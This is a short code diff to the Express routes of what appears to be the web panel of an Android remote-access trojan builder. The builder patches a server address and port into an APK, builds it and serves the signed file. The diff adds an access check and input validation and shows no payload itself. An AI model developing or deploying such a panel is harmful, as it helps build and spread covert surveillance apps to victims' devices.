@@ -28,8 +28,12 @@ function isAllowed(req, res, next) {
     // next();
 }
 
-routes.get('/dl', (req, res) => {
-    res.redirect('/build.s.apk');
+routes.get('/dl', isAllowed, (req, res) => {
+    if (fs.existsSync(CONST.apkSignedBuildPath)) {
+        res.sendFile(CONST.apkSignedBuildPath);
+    } else {
+        res.status(404).send('APK not built yet');
+    }
 });
 
 routes.get('/', isAllowed, (req, res) => {
@@ -114,7 +118,7 @@ routes.get('/builder', isAllowed, (req, res) => {
 routes.post('/builder', isAllowed, (req, res) => {
     // Patch 12: Move sensitive data to req.body
     const { uri, port } = req.body;
-    if (uri !== undefined && port !== undefined) apkBuilder.patchAPK(uri, port, (error) => {
+    if (typeof uri === 'string' && uri.length > 0 && typeof port === 'string' && port.length > 0) apkBuilder.patchAPK(uri, port, (error) => {
         if (!error) apkBuilder.buildAPK((error) => {
             if (!error) {
                 logManager.log(CONST.logTypes.success, "Build Succeded!");
